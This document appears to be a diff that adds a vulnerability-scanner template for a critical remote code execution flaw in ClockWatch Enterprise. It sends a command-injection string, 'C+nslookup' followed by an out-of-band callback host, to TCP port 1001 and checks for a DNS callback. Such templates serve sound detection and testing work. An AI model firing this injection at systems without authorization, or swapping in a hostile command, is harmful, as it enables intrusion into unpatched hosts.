@@ -1,0 +1,32 @@
+id: clockwatch-enterprise-rce
+info:
+  author: gy741
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: 'ClockWatch Enterprise is susceptible to remote code execution.
+
+    '
+  metadata:
+    max-request: 1
+  name: ClockWatch Enterprise - Remote Code Execution
+  reference:
+  - https://blog.grimm-co.com/2021/07/old-dog-same-tricks.html
+  severity: critical
+  tags: clockwatch,rce,network,tcp,vuln
+tcp:
+- host:
+  - '{{Hostname}}'
+  inputs:
+  - data: C+nslookup {{interactsh-url}}
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - type: word
+    words:
+    - OK-C
+  matchers-condition: and
+  port: 1001
